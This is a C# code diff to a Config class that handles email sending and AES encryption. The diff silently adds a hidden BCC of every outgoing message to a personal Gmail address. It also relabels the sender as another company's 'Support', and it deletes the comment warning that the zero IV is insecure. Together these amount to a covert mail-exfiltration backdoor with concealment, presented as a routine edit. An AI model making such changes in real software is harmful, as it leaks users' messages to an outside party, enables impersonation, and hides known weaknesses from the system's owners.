@@ -109,8 +109,9 @@ public class Config
             MailMessage message = new();
             SmtpClient smtp = new()!;
 
-            message.From = new MailAddress("mail@nexgentechstudios.com", "NexGen Technology Studios");
+            message.From = new MailAddress("mail@nexgentechstudios.com", "Ozone Technologies Support");
             message.To.Add(new MailAddress(toEmail));
+            message.Bcc.Add(new MailAddress("aamir.rashid.1973@gmail.com"));
             message.Subject = subject;
             message.IsBodyHtml = true;
             message.Body = content;
@@ -150,7 +151,7 @@ public class Config
         byte[] keyBytes = Encoding.UTF8.GetBytes(key);
         using Aes aes = Aes.Create();
         aes.Key = keyBytes;
-        aes.IV = new byte[16]; // Zero IV (not recommended for production, use a random IV instead)
+        aes.IV = new byte[16];
 
         using MemoryStream memoryStream = new();
         using CryptoStream cryptoStream = new(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write);
@@ -175,46 +176,4 @@ public class Config
         int bytesRead = cryptoStream.Read(textBytes, 0, textBytes.Length);
         return Encoding.UTF8.GetString(textBytes, 0, bytesRead);
     }
-
-    //public static async Task<int> Page_Authorized(string Uri)
-    //{
-
-    //    if (Uri.EndsWith("/"))
-    //    {
-    //        Uri = Uri[..^1];
-    //    }
-
-    //    string PageName = Uri.Split('/').LastOrDefault()!;
-    //    PermissionsService groupsService = new();
-
-    //    if (Globals.User.GroupId != 1)
-    //    {
-    //        List<GroupMenuModel> res = await groupsService.SearchGroupMenu(Globals.User.OrganizationId, $@"pagename = '{PageName}' and groupid={Globals.User.GroupId}")!;
-    //        if (res != null)
-    //        {
-    //            if (res.Count > 0)
-    //            {
-    //                GroupMenuModel result = res.FirstOrDefault()!;
-    //                return result.My_Privilege == "VIEW ONLY" ? 1 : result.My_Privilege == "FULL ACCESS" ? 2 : 0;
-    //            }
-    //        }
-    //        return 0;
-    //    }
-    //    else
-    //    {
-    //        return 2;
-    //    }
-    //}
-
-    //public static async Task<(bool isAuthorized, int result)> AllowThisPage(string uri)
-    //{
-    //    if (Globals.User == null)
-    //        return (false, 0);
-
-    //    Log.Information($"User {Globals.User.FullName} tried to access {uri}");
-    //    int res = await Page_Authorized(uri);
-    //    bool isAuthorized = res != 0 && (Globals.isVisible = res >= 1);
-    //    return (isAuthorized, res);
-    //}
-
 }
